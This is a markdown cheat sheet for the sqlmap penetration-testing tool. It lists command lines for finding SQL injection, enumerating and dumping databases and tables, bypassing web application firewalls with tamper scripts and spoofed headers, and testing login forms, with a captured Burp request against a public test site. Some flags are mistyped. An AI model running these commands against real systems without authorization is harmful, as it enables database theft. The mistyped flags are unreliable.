## Sqlmap 

SQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws
SQLmap automates the process of detecting and exploiting SQL injection
SQL Injection attacks can take control of databases that utilize SQL.


## 1. Find Sql Injection 

    sqlmap -u example.com --crawl 10 --batch 
    sqlmap -u example.com --crawl 10 --batch --level 5 --risk 3 --cookie="PHPSESSID=a8d127e.." -A "Mozilla/5.0...Firefox/102.0" -H "Referer: https://abc.com" 

## 2. Find Information in vulnerable url

    sqlmap -u example.com --current-user --current-db --batch --technique (default "BEUSTQ")
    
    
## 3. Find database names in vulnerable url

    sqlmap -u example.com --dbs --batch --technique (default "BEUSTQ")

## 4. Find Tables in databases 

    sqlmap -u example.com -D databasename --tables --batch --technique (default "BEUSTQ")
    
## 5. Find Tables all data 

    sqlmap -u example.com -D databasename -T tabelsname --dump --batch --technique (default "BEUSTQ")

## 5. Find Data type in store in tables like rows colums 

    sqlmap -u example.com -D databasename -T tabelsname --columns -batch --technique (default "BEUSTQ")
    
## 6. Find all tables information in databases
 
    sqlmap -u example.com -D databasename --dump-all -batch --technique (default "BEUSTQ")
     
## 7. Find vulnerable urls save in directory 

    sqlmap -u example.com --crawl 10 --batch --output-dir="/home/asif/sql/"
    
## 8. Add users difine Haders  

    sqlmap -u example.com --batch --crawl 3 --headers="Referer:abc.com" 
  
## 9. Use USER_AGENT Bypass WAF

    sqlmap -u example.com --batch --crawl 3 --user-agent="asifkhan" 
    sqlmap -u example.com --batch --crawl 3 --mobile
  
## 10. Use TAMPER Bypass WAF

Try One By One Tamper list option to bypass the WAF
  
    sqlmap --list-tampers
    sqlmap -u example.com --batch --crawl 3 --tamper=base64encode
    
## 11. Find Which paylods to use find sql inejction 

    sqlmap -u example.com --batch --crawl 3 -v 3
    
## 12. Test one parameter like username y password 

     sqlmap -u example.com/loging.php -p usernaem
     
     
## 13. You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

      sqlmap -u example.com -DBMS=MYSQL

  
## 14. Test Burp_Suite Request sql vulnerablity

  1. Capture request in burp suite like 

         POST /userinfo.php HTTP/1.1
         Host: testphp.vulnweb.com
         User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 20
         Origin: http://testphp.vulnweb.com
         Connection: close
         Referer: http://testphp.vulnweb.com/login.php
         Upgrade-Insecure-Requests: 1

         uname=asif&pass=khan

  3. Copy The capture request in file like file name is khan and run sqlmap like

         sqlmap -r khan
  
  
## 15. Use Proxy and sand the request in burp_suite like 
  
  Open The Bur_suite and start intercept 
  
     sqlmap -u example.com --crawl 3 --proxy="127.0.0.1:8080"

  
 ## 16. Test Loging_page vulnerablity
 
  1. Loging Page urls 
  2. Check loging page Form Name 
  3. First check username Form like 

         <input name="uname" type="text" size="20" style="width:120px;">
         
 Here uname is Form name "uname"
 
 4. Secand Check password Form like 

        <input name="pass" type="password" size="20" style="width:120px;">         
          
 Here is pass is Form name "pass"
 
 5. Next Check Loging Button Form 

        <input type="submit" value="login" style="width:75px;">
        
 Here submit is Form name "submit" 
 
 6. Next Check Form where urls submite 

        <form name="loginform" method="post" action="userinfo.php">
        
 My Form is submite This Urls "userinfo.php"
               
 7. Finall Step use sqlmap like

        sqlmap -u example.com/login.php --forms
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
  
